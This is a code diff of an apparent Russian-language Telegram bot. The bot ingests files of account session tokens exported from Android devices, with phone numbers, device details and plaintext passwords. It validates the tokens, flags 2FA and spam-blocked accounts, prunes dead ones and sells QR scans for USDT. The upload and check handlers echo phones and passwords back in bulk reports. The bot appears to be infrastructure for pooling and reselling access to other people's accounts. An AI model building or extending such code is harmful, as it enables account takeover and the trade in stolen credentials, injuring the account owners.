@@ -1324,14 +1312,14 @@ async def handle_edit_balance_amount(message: types.Message, state: FSMContext):
             amount = float(amount_str[1:])
             new_balance = users[uid].get("balance", 0) - amount
             if new_balance < 0:
-                await safe_send_message(message.chat.id, "❌ Баланс не может быть отрицательным!")
+                await message.answer("❌ Баланс не может быть отрицательным!")
                 return
             users[uid]["balance"] = new_balance
             operation = f"снято <b>${amount:.2f}</b>"
         else:
             amount = float(amount_str)
             if amount < 0:
-                await safe_send_message(message.chat.id, "❌ Баланс не может быть отрицательным!")
+                await message.answer("❌ Баланс не может быть отрицательным!")
                 return
             old_balance = users[uid].get("balance", 0)
             users[uid]["balance"] = amount
@@ -1339,16 +1327,25 @@ async def handle_edit_balance_amount(message: types.Message, state: FSMContext):
         
         save_users()
         
-        text = f"✅ Баланс пользователя <code>{user_id}</code> изменён!\n\n💰 {operation}\n💳 Новый баланс: <b>${users[uid]['balance']:.2f}</b>"
-        await safe_send_message(message.chat.id, text, parse_mode="HTML")
+        await message.answer(
+            f"✅ Баланс пользователя <code>{user_id}</code> изменён!\n\n"
+            f"💰 {operation}\n"
+            f"💳 Новый баланс: <b>${users[uid]['balance']:.2f}</b>",
+            parse_mode="HTML"
+        )
         
         try:
-            await safe_send_message(user_id, f"💰 Ваш баланс был изменён администратором!\n\n💳 Текущий баланс: <b>${users[uid]['balance']:.2f}</b>", parse_mode="HTML")
+            await bot.send_message(
+                user_id,
+                f"💰 Ваш баланс был изменён администратором!\n\n"
+                f"💳 Текущий баланс: <b>${users[uid]['balance']:.2f}</b>",
+                parse_mode="HTML"
+            )
         except:
             pass
         
     except ValueError:
-        await safe_send_message(message.chat.id, "❌ Введите корректное число или используйте форматы:\n• +50 — добавить\n• -10 — снять\n• 100 — установить")
+        await message.answer("❌ Введите корректное число или используйте форматы:\n• +50 — добавить\n• -10 — снять\n• 100 — установить")
         return
     
     await state.clear()
@@ -1360,21 +1357,15 @@ async def cb_admin_upload(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return await callback.answer("❌ Только для админа", show_alert=True)
     
-    text = (
+    await callback.message.answer(
         "📦 <b>Отправьте файл с токенами</b>\n\n"
         "<b>Поддерживаемые форматы:</b>\n"
-        "• .txt - любые текстовые форматы токенов\n"
+        "• .txt - любые текстовые форматы\n"
         "• .json - JSON любого формата\n"
         "• .zip - архив с файлами\n\n"
-        "<b>Бот покажет детальную информацию:</b>\n"
-        "• Номер телефона/устройство\n"
-        "• Пароль (если найден)\n"
-        "• Статус проверки\n"
-        "• Ошибки для нерабочих токенов\n\n"
-        "<i>Поддерживаются все форматы экспорта Android!</i>"
+        "<i>Бот автоматически проверит токены и покажет результат</i>",
+        parse_mode="HTML"
     )
-    
-    await safe_send_message(callback.message.chat.id, text, parse_mode="HTML")
     await callback.answer()
 
 @dp.message(F.document)
@@ -1386,355 +1377,77 @@ async def handle_document(message: types.Message):
     file_name = doc.file_name.lower()
     
     if not file_name.endswith(('.txt', '.json', '.zip')):
-        await safe_send_message(message.chat.id, "❌ Отправьте файл .txt, .json или .zip")
+        await message.answer("❌ Отправьте файл .txt, .json или .zip")
         return
     
-    msg = await safe_send_message(message.chat.id, "⏳ Обрабатываю файл...")
+    msg = await message.answer("⏳ Обрабатываю файл...")
     
     try:
         file = await bot.get_file(doc.file_id)
         file_bytes = await bot.download_file(file.file_path)
         
+        content = file_bytes.read().decode('utf-8')
+        
+        # Обрабатываем с валидацией
+        token_results = await process_tokens_with_validation(content)
+        
+        # Подсчитываем статистику
         added = 0
-        skipped = 0
-        duplicates = 0
-        passwords_found = 0
-        token_details = []
+        skipped_duplicate = 0
+        skipped_error = 0
+        skipped_2fa_no_pass = 0
+        removed_from_pool = 0
+        spam_blocked = 0
         
-        if file_name.endswith('.zip'):
-            zip_buffer = BytesIO(file_bytes.read())
-            with zipfile.ZipFile(zip_buffer, 'r') as zf:
-                for inner_file in zf.namelist():
-                    if not inner_file.endswith(('.txt', '.json')):
-                        continue
-                    try:
-                        content = zf.read(inner_file).decode('utf-8')
-                        a, s, d, p, details = process_content_detailed(content)
-                        added += a
-                        skipped += s
-                        duplicates += d
-                        passwords_found += p
-                        token_details.extend(details)
-                    except Exception as e:
-                        logger.error(f"Error processing {inner_file}: {e}")
-                        skipped += 1
-        else:
-            content = file_bytes.read().decode('utf-8')
-            added, skipped, duplicates, passwords_found, token_details = process_content_detailed(content)
+        for result in token_results:
+            if result["status"] == "added":
+                added += 1
+                if result.get("spam_blocked"):
+                    spam_blocked += 1
+            elif result["status"] == "duplicate":
+                skipped_duplicate += 1
+            elif result["status"] == "error":
+                skipped_error += 1
+            elif result["status"] == "2fa_no_pass":
+                skipped_2fa_no_pass += 1
+            elif result["status"] == "removed":
+                removed_from_pool += 1
         
         save_accounts()
         
-        # Отчет о загрузке
-        report = f"📦 <b>ЗАГРУЗКА ТОКЕНОВ</b>\n\n➕ Добавлено: <b>{added}</b>\n🔄 Дубликатов: <b>{duplicates}</b>\n⏭ Пропущено: <b>{skipped}</b>\n🔑 Найдено паролей: <b>{passwords_found}</b>\n📊 Всего в базе: <b>{len(accounts)}</b>"
+        # Формируем вывод
+        file_type = "📦 ZIP" if file_name.endswith('.zip') else "📄 Файл"
+        report = f"👍 {file_type} обработан\n\n"
+        report += f"Добавлено: {added} · Пропущено (уже в базе): {skipped_duplicate} · Ошибок: {skipped_error}\n"
+        report += f"Пропуск (2FA без пароля): {skipped_2fa_no_pass} · Удалено из пула: {removed_from_pool}\n"
+        report += f"Со спамблоком: {spam_blocked} из добавленных\n\n"
         
-        await msg.edit_text(report, parse_mode="HTML")
-        
-        # Детали по токенам (группами по 10)
-        if token_details:
-            detail_chunks = [token_details[i:i+10] for i in range(0, len(token_details), 10)]
+        # Добавляем каждый токен
+        for result in token_results:
+            phone = result.get("phone", "unknown")
+            password = result.get("password", "")
+            status = result["status"]
+            error = result.get("error", "")
             
-            for chunk_num, chunk in enumerate(detail_chunks):
-                detail_text = f"📋 <b>Детали токенов (часть {chunk_num + 1}/{len(detail_chunks)}):</b>\n\n"
-                
-                for detail in chunk:
-                    status_emoji = "✅" if detail["status"] == "added" else "🔄" if detail["status"] == "duplicate" else "❌"
-                    
-                    detail_text += f"{status_emoji} <b>Токен #{detail['index']}</b>\n"
-                    detail_text += f"📱 <b>Устройство:</b> <code>{detail['phone'][:30]}</code>\n"
-                    
-                    if detail.get("password"):
-                        detail_text += f"🔑 <b>Пароль:</b> <code>{detail['password']}</code>\n"
-                    else:
-                        detail_text += f"🔑 <b>Пароль:</b> <i>не найден</i>\n"
-                    
-                    if detail.get("device_name"):
-                        detail_text += f"📱 <b>Модель:</b> {detail['device_name']}\n"
-                    
-                    if detail.get("custom_payload"):
-                        detail_text += f"🔢 <b>Payload:</b> <code>{detail['custom_payload']}</code>\n"
-                    
-                    if detail["status"] == "duplicate":
-                        detail_text += "⚠️ <i>Дубликат, пропущен</i>\n"
-                    elif detail["status"] == "error":
-                        detail_text += f"❌ <i>Ошибка: {detail.get('error', 'неизвестно')}</i>\n"
-                    
-                    detail_text += "\n"
-                
-                # Отправляем частями если нужно
-                if len(detail_text) > 4000:
-                    for i in range(0, len(detail_text), 4000):
-                        await safe_send_message(message.chat.id, detail_text[i:i+4000], parse_mode="HTML")
+            if status == "added":
+                if password:
+                    report += f"· {phone} ✓ | пароль: {password}\n"
                 else:
-                    await safe_send_message(message.chat.id, detail_text, parse_mode="HTML")
+                    report += f"· {phone} ✓\n"
+            elif status == "duplicate":
+                report += f"· {phone} ↻ уже в базе\n"
+            elif status == "error":
+                report += f"· {phone} ✗ {error}\n"
+            elif status == "2fa_no_pass":
+                report += f"· {phone} 🔐 2FA без пароля\n"
+            elif status == "removed":
+                report += f"· {phone} 🗑 удалён\n"
         
-        # Проверка токенов
-        status_msg = await safe_send_message(message.chat.id, "🔍 <b>Начинаю проверку токенов...</b>\n<i>Это может занять несколько минут</i>", parse_mode="HTML")
-        
-        valid = 0
-        invalid = 0
-        twofa = 0
-        to_remove = []
-        validation_details = []
-        
-        total = len(accounts)
-        checked = 0
-        
-        for acc_id, acc in list(accounts.items()):
-            checked += 1
-            
-            if checked % 5 == 0 or checked == total:
-                try:
-                    await status_msg.edit_text(
-                        f"🔍 <b>Проверка токенов...</b>\nПрогресс: <b>{checked}/{total}</b>\n✅ Валидных: <b>{valid}</b>\n🔐 С 2FA: <b>{twofa}</b>\n❌ Битых: <b>{invalid}</b>",
-                        parse_mode="HTML"
-                    )
-                except:
-                    pass
-            
-            result = await validate_token(acc["token"], acc["device_id"], acc.get("device_info"))
-            
-            phone = acc.get("phone", "unknown")
-            password = acc.get("password", "")
-            device_name = acc.get("device_info", {}).get("deviceName", "")
-            
-            detail = {
-                "phone": phone,
-                "password": password,
-                "device_name": device_name,
-                "status": "",
-                "error": ""
-            }
-            
-            if result["valid"]:
-                valid += 1
-                if result.get("has_2fa"):
-                    twofa += 1
-                    detail["status"] = "2fa"
-                    detail["warning"] = result.get("warning", "Требуется 2FA")
-                else:
-                    detail["status"] = "valid"
-            else:
-                invalid += 1
-                to_remove.append(acc_id)
-                detail["status"] = "invalid"
-                detail["error"] = result.get("error", "неизвестная ошибка")
-            
-            validation_details.append(detail)
-        
-        # Удаляем невалидные
-        for acc_id in to_remove:
-            del accounts[acc_id]
-        save_accounts()
-        
-        # Отчет о проверке
-        validation_report = f"✅ <b>ПРОВЕРКА ЗАВЕРШЕНА!</b>\n\n📦 Всего проверено: <b>{total}</b>\n✅ Валидных: <b>{valid}</b>\n🔐 С 2FA: <b>{twofa}</b>\n❌ Удалено: <b>{invalid}</b>\n📊 Осталось в базе: <b>{len(accounts)}</b>"
-        
-        await safe_send_message(message.chat.id, validation_report, parse_mode="HTML")
-        
-        # Детали проверки (группами по 15)
-        if validation_details:
-            detail_chunks = [validation_details[i:i+15] for i in range(0, len(validation_details), 15)]
-            
-            for chunk_num, chunk in enumerate(detail_chunks):
-                detail_text = f"📋 <b>Результаты проверки (часть {chunk_num + 1}/{len(detail_chunks)}):</b>\n\n"
-                
-                for detail in chunk:
-                    if detail["status"] == "valid":
-                        emoji = "✅"
-                        status_text = "Рабочий"
-                    elif detail["status"] == "2fa":
-                        emoji = "🔐"
-                        status_text = f"2FA: {detail.get('warning', '')}"
-                    else:
-                        emoji = "❌"
-                        status_text = f"Ошибка: {detail['error']}"
-                    
-                    detail_text += f"{emoji} <b>Аккаунт:</b> <code>{detail['phone'][:25]}</code>\n"
-                    
-                    if detail["password"]:
-                        detail_text += f"   🔑 <b>Пароль:</b> <code>{detail['password']}</code>\n"
-                    
-                    if detail["device_name"]:
-                        detail_text += f"   📱 <b>Устройство:</b> {detail['device_name']}\n"
-                    
-                    detail_text += f"   📊 <b>Статус:</b> {status_text}\n\n"
-                
-                if len(detail_text) > 4000:
-                    for i in range(0, len(detail_text), 4000):
-                        await safe_send_message(message.chat.id, detail_text[i:i+4000], parse_mode="HTML")
-                else:
-                    await safe_send_message(message.chat.id, detail_text, parse_mode="HTML")
-        
-        # Итоговая сводка
-        summary = f"📊 <b>ИТОГОВАЯ СВОДКА</b>\n\n📦 Загружено: <b>{added}</b>\n✅ Рабочих: <b>{valid}</b>\n🔐 С 2FA: <b>{twofa}</b>\n❌ Удалено: <b>{invalid}</b>\n📊 В базе: <b>{len(accounts)}</b>\n🔑 С паролями: <b>{passwords_found}</b>"
-        
-        await safe_send_message(message.chat.id, summary, parse_mode="HTML")
+        await msg.edit_text(report)
         
     except Exception as e:
         logger.error(f"Upload error: {e}")
-        await safe_send_message(message.chat.id, f"❌ Ошибка при обработке файла: {str(e)}")
-
-def process_content_detailed(content: str) -> tuple:
-    added = 0
-    skipped = 0
-    duplicates = 0
-    passwords_found = 0
-    token_details = []
-    token_index = 0
-    
-    # Пробуем JSON
-    try:
-        data = json.loads(content)
-        parsed_tokens = UniversalTokenParser.parse_json_data(data)
-        
-        for token_data in parsed_tokens:
-            token_index += 1
-            
-            detail = {
-                "index": token_index,
-                "phone": token_data.get("phone", "unknown"),
-                "password": token_data.get("password", ""),
-                "device_name": token_data.get("device_info", {}).get("deviceName", ""),
-                "custom_payload": token_data.get("custom_payload"),
-                "status": ""
-            }
-            
-            if token_data.get("password"):
-                passwords_found += 1
-            
-            result = add_account(
-                token=token_data["token"],
-                device_info=token_data["device_info"],
-                password=token_data["password"],
-                phone=token_data["phone"],
-                custom_payload=token_data["custom_payload"]
-            )
-            
-            if result == "added":
-                added += 1
-                detail["status"] = "added"
-            elif result == "duplicate":
-                duplicates += 1
-                detail["status"] = "duplicate"
-            else:
-                skipped += 1
-                detail["status"] = "error"
-                detail["error"] = "Не удалось добавить"
-            
-            token_details.append(detail)
-        
-        if parsed_tokens:
-            return added, skipped, duplicates, passwords_found, token_details
-    except json.JSONDecodeError:
-        pass
-    
-    # Построчная обработка
-    lines = content.strip().split('\n')
-    json_objects = []
-    text_blocks = []
-    current_block = []
-    
-    for line in lines:
-        line_stripped = line.strip()
-        if not line_stripped:
-            if current_block:
-                text_blocks.append('\n'.join(current_block))
-                current_block = []
-            continue
-        
-        try:
-            data = json.loads(line_stripped)
-            if isinstance(data, dict):
-                json_objects.append(data)
-                continue
-        except json.JSONDecodeError:
-            pass
-        
-        current_block.append(line)
-    
-    if current_block:
-        text_blocks.append('\n'.join(current_block))
-    
-    # Обрабатываем JSON объекты
-    for json_obj in json_objects:
-        parsed = UniversalTokenParser.parse_single_json(json_obj)
-        if parsed:
-            token_index += 1
-            
-            detail = {
-                "index": token_index,
-                "phone": parsed.get("phone", "unknown"),
-                "password": parsed.get("password", ""),
-                "device_name": parsed.get("device_info", {}).get("deviceName", ""),
-                "custom_payload": parsed.get("custom_payload"),
-                "status": ""
-            }
-            
-            if parsed.get("password"):
-                passwords_found += 1
-            
-            result = add_account(
-                token=parsed["token"],
-                device_info=parsed["device_info"],
-                password=parsed["password"],
-                phone=parsed["phone"],
-                custom_payload=parsed["custom_payload"]
-            )
-            
-            if result == "added":
-                added += 1
-                detail["status"] = "added"
-            elif result == "duplicate":
-                duplicates += 1
-                detail["status"] = "duplicate"
-            else:
-                skipped += 1
-                detail["status"] = "error"
-                detail["error"] = "Не удалось добавить"
-            
-            token_details.append(detail)
-    
-    # Обрабатываем текстовые блоки
-    for block in text_blocks:
-        parsed_tokens = UniversalTokenParser.parse_text_block(block)
-        
-        for token_data in parsed_tokens:
-            token_index += 1
-            
-            detail = {
-                "index": token_index,
-                "phone": token_data.get("phone", "unknown"),
-                "password": token_data.get("password", ""),
-                "device_name": token_data.get("device_info", {}).get("deviceName", ""),
-                "custom_payload": token_data.get("custom_payload"),
-                "status": ""
-            }
-            
-            if token_data.get("password"):
-                passwords_found += 1
-            
-            result = add_account(
-                token=token_data["token"],
-                device_info=token_data["device_info"],
-                password=token_data["password"],
-                phone=token_data["phone"],
-                custom_payload=token_data["custom_payload"]
-            )
-            
-            if result == "added":
-                added += 1
-                detail["status"] = "added"
-            elif result == "duplicate":
-                duplicates += 1
-                detail["status"] = "duplicate"
-            else:
-                skipped += 1
-                detail["status"] = "error"
-                detail["error"] = "Не удалось добавить"
-            
-            token_details.append(detail)
-    
-    return added, skipped, duplicates, passwords_found, token_details
+        await msg.edit_text(f"❌ Ошибка: {e}")
 
 # ==================== ПРОВЕРКА ТОКЕНОВ ====================
 
@@ -1748,13 +1461,12 @@ async def cb_check_tokens(callback: types.CallbackQuery):
         return
     
     await callback.answer("🔍 Начинаю проверку...")
-    msg = await safe_send_message(callback.message.chat.id, f"🔍 Проверяю <b>{len(accounts)}</b> токенов...", parse_mode="HTML")
+    msg = await callback.message.answer(f"🔍 Проверяю <b>{len(accounts)}</b> токенов...", parse_mode="HTML")
     
     valid_count = 0
     invalid_count = 0
     twofa_count = 0
-    invalid_tokens = []
-    twofa_list = []
+    token_results = []
     
     total = len(accounts)
     checked = 0
@@ -1763,42 +1475,41 @@ async def cb_check_tokens(callback: types.CallbackQuery):
         checked += 1
         result = await validate_token(acc["token"], acc["device_id"], acc.get("device_info"))
         
+        phone = acc.get("phone", acc_id[:8])
+        password = acc.get("password", "")
+        
         if result["valid"]:
             valid_count += 1
             if result.get("has_2fa"):
                 twofa_count += 1
-                phone = acc.get("phone", acc_id[:8])
-                pwd = acc.get("password", "")
-                pwd_info = f" [пароль: {pwd}]" if pwd else ""
-                twofa_list.append(f"• {phone}{pwd_info}")
+                token_results.append(f"· {phone} 🔐 2FA | пароль: {password}" if password else f"· {phone} 🔐 2FA")
+            else:
+                token_results.append(f"· {phone} ✓ | пароль: {password}" if password else f"· {phone} ✓")
         else:
             invalid_count += 1
-            phone = acc.get("phone", acc_id[:8])
-            error = result.get("error", "неизвестная ошибка")
-            invalid_tokens.append(f"• {phone}: {error}")
+            error = result.get("error", "неизвестно")
+            token_results.append(f"· {phone} ✗ {error}")
             del accounts[acc_id]
         
         if checked % 5 == 0 or checked == total:
             await msg.edit_text(
-                f"🔍 Проверка: <b>{checked}</b>/{total}\n✅ Валидных: {valid_count}\n🔐 С 2FA: {twofa_count}\n❌ Битых: {invalid_count}",
+                f"🔍 Проверка: <b>{checked}</b>/{total}\n"
+                f"✅ Валидных: {valid_count}\n"
+                f"🔐 С 2FA: {twofa_count}\n"
+                f"❌ Битых: {invalid_count}",
                 parse_mode="HTML"
             )
     
     save_accounts()
     
-    text = f"📊 <b>Проверка завершена!</b>\n\n✅ Рабочих: <b>{valid_count}</b>\n🔐 С 2FA: <b>{twofa_count}</b>\n❌ Удалено: <b>{invalid_count}</b>\n📊 Осталось в базе: <b>{len(accounts)}</b>"
+    report = f"📊 <b>Проверка завершена!</b>\n\n"
+    report += f"✅ Рабочих: <b>{valid_count}</b>\n"
+    report += f"🔐 С 2FA: <b>{twofa_count}</b>\n"
+    report += f"❌ Удалено: <b>{invalid_count}</b>\n"
+    report += f"📊 Осталось в базе: <b>{len(accounts)}</b>\n\n"
+    report += "\n".join(token_results)
     
-    if twofa_list:
-        text += "\n\n<b>🔐 Токены с 2FA:</b>\n" + "\n".join(twofa_list[:15])
-        if len(twofa_list) > 15:
-            text += f"\n...и ещё {len(twofa_list) - 15}"
-    
-    if invalid_tokens:
-        text += "\n\n<b>❌ Удалённые токены:</b>\n" + "\n".join(invalid_tokens[:10])
-        if len(invalid_tokens) > 10:
-            text += f"\n...и ещё {len(invalid_tokens) - 10}"
-    
-    await msg.edit_text(text, parse_mode="HTML")
+    await msg.edit_text(report, parse_mode="HTML")
 
 # ==================== АДМИНКА ====================
 
@@ -1808,7 +1519,7 @@ async def cb_admin_broadcast(callback: types.CallbackQuery, state: FSMContext):
         return await callback.answer("❌ Только для админа", show_alert=True)
     
     await state.set_state(AuthState.waiting_broadcast)
-    await safe_send_message(callback.message.chat.id, "📢 Введите текст для рассылки всем пользователям:")
+    await callback.message.answer("📢 Введите текст для рассылки всем пользователям:")
     await callback.answer()
 
 @dp.message(AuthState.waiting_broadcast)
@@ -1820,12 +1531,12 @@ async def handle_broadcast(message: types.Message, state: FSMContext):
     sent = 0
     for uid in users:
         try:
-            await safe_send_message(int(uid), text)
+            await bot.send_message(int(uid), text)
             sent += 1
         except:
             pass
     
-    await safe_send_message(message.chat.id, f"✅ Рассылка отправлена! Получили: <b>{sent}</b> пользователей.", parse_mode="HTML")
+    await message.answer(f"✅ Рассылка отправлена! Получили: <b>{sent}</b> пользователей.", parse_mode="HTML")
     await state.clear()
 
 @dp.callback_query(F.data == "admin_price")
@@ -1834,8 +1545,11 @@ async def cb_admin_price(callback: types.CallbackQuery, state: FSMContext):
         return await callback.answer("❌ Только для админа", show_alert=True)
     
     await state.set_state(AuthState.waiting_new_price)
-    text = f"💵 Текущая цена: <b>${PRICE_PER_QR:.2f}</b>\n\nВведите новую цену в USDT (например 3.50):"
-    await safe_send_message(callback.message.chat.id, text, parse_mode="HTML")
+    await callback.message.answer(
+        f"💵 Текущая цена: <b>${PRICE_PER_QR:.2f}</b>\n\n"
+        f"Введите новую цену в USDT (например 3.50):",
+        parse_mode="HTML"
+    )
     await callback.answer()
 
 @dp.message(AuthState.waiting_new_price)
@@ -1846,19 +1560,18 @@ async def handle_new_price(message: types.Message, state: FSMContext):
     try:
         new_price = float(message.text.strip())
     except:
-        await safe_send_message(message.chat.id, "❌ Введите число (например 3.50)")
+        await message.answer("❌ Введите число (например 3.50)")
         return
     
     if new_price <= 0:
-        await safe_send_message(message.chat.id, "❌ Цена должна быть больше 0")
+        await message.answer("❌ Цена должна быть больше 0")
         return
     
     global PRICE_PER_QR
     old_price = PRICE_PER_QR
     PRICE_PER_QR = new_price
     
-    text = f"✅ Цена изменена!\n\nСтарая: <b>${old_price:.2f}</b>\nНовая: <b>${new_price:.2f}</b>"
-    await safe_send_message(message.chat.id, text, parse_mode="HTML")
+    await message.answer(f"✅ Цена изменена!\n\nСтарая: <b>${old_price:.2f}</b>\nНовая: <b>${new_price:.2f}</b>", parse_mode="HTML")
     await state.clear()
 
 @dp.callback_query(F.data == "admin_stats")
@@ -1872,9 +1585,17 @@ async def cb_admin_stats(callback: types.CallbackQuery):
     total_scans = sum(g.get("total_scans", 0) for g in groups.values())
     total_earned = sum(u.get("total_scans", 0) * PRICE_PER_QR for u in users.values())
     
-    text = f"📊 <b>Статистика</b>\n\n👥 Пользователей: <b>{total_users}</b>\n👥 Групп: <b>{total_groups}</b>\n📱 Аккаунтов: <b>{total_accounts}</b>\n📷 Всего сканов: <b>{total_scans}</b>\n💰 Заработано: <b>${total_earned:.2f}</b>\n💎 Цена QR: <b>${PRICE_PER_QR:.2f}</b>"
+    text = (
+        f"📊 <b>Статистика</b>\n\n"
+        f"👥 Пользователей: <b>{total_users}</b>\n"
+        f"👥 Групп: <b>{total_groups}</b>\n"
+        f"📱 Аккаунтов: <b>{total_accounts}</b>\n"
+        f"📷 Всего сканов: <b>{total_scans}</b>\n"
+        f"💰 Заработано: <b>${total_earned:.2f}</b>\n"
+        f"💎 Цена QR: <b>${PRICE_PER_QR:.2f}</b>"
+    )
     
-    await safe_send_message(callback.message.chat.id, text, parse_mode="HTML")
+    await callback.message.answer(text, parse_mode="HTML")
     await callback.answer()
 
 # ==================== ЗАПУСК ====================
